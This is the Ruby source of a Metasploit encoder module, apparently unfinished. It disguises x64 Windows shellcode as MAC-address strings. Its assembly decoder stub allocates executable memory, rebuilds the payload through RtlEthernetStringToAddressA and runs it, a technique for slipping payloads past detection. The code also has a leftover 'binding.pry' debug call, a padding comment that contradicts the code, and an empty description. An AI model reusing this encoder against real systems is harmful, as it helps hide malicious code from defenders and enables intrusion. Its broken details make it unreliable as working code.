##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::Xor
  
  include Msf::Payload::Windows::BlockApi_x64
  
  def initialize
    super(
      'Name' => 'MAC Encoder',
      'Description' => '',
      'Author' => [ 'msutovsky-r7' ],
      'Arch' => ARCH_X64,
      'License' => MSF_LICENSE,
      'Decoder' => {
        'BlockSize' => 6
      }
      )
  end

  def mac_obfuscate(payload)
    bytes = payload.bytes
    # Pad to a multiple of 4 bytes
    remainder = bytes.length % 6
    bytes += [255] * (6 - remainder) if remainder != 0

    chunks = []
    i = 0
    bytes.each_slice(6) do |quad|
      chunks << quad.map { |b| format('%02X', b) }.join('-')
      i += 1
    end
    chunks
  end

  def encode_block(state, block)
    mac_obfuscate(block).join + "\x00"
  end
  
  def decoder_stub(state)
    binding.pry
    asm = %Q^
      jmp get_payload
    got_payload:
      pop r15
      call start
      #{asm_block_api}
    start:
      pop rbp

      mov r9d,0x40                    ; PAGE_EXECUTE_READ_WRITE
      mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
      mov rdx,#{state.orig_buf.length}; dwSize
      xor rcx,rcx                     ; lpAddress
      mov r10d,#{block_api_hash('kernel32.dll', 'VirtualAlloc')}
      call rbp

      push rsp 
      mov r12, rsp
      mov r13, rax
      mov r8, r13
    loop:
      mov rdx, r12
      mov rcx, r15
      mov r10d, #{block_api_hash('ntdll.dll', 'RtlEthernetStringToAddressA')}
      call rbp            ; RtlEthernetStringToAddressA
      add r15, 0x12
      add r8, 0x6
      cmp [r15], 0x0
      jnz loop
      call r13
    get_payload:
      call got_payload
    ^

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end
end
